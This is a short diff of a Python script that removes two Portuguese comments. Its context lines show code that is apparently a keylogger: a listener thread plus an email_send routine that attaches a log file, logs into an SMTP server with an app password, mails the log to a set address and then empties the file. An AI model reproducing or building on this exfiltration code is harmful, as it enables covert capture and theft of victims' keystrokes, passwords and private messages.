@@ -50,14 +50,14 @@ def email_send():
             part.add_header('Content-Disposition', f'attachment; filename={log_file}')
             msg.attach(part)
 
-            # Envia o email
+            
             server = smtplib.SMTP(smtp_server, smtp_port)
             server.starttls()
             server.login(sender_email, app_password)
             server.sendmail(sender_email, destination_email, msg.as_string())
             server.quit()
 
-            # Limpa o arquivo após enviar
+            
             with open(log_file, 'w') as f:
                 f.truncate(0)
 
@@ -72,3 +72,4 @@ listener.start()
 threading.Thread(target=email_send, daemon=True).start()
 
 listener.join()
+
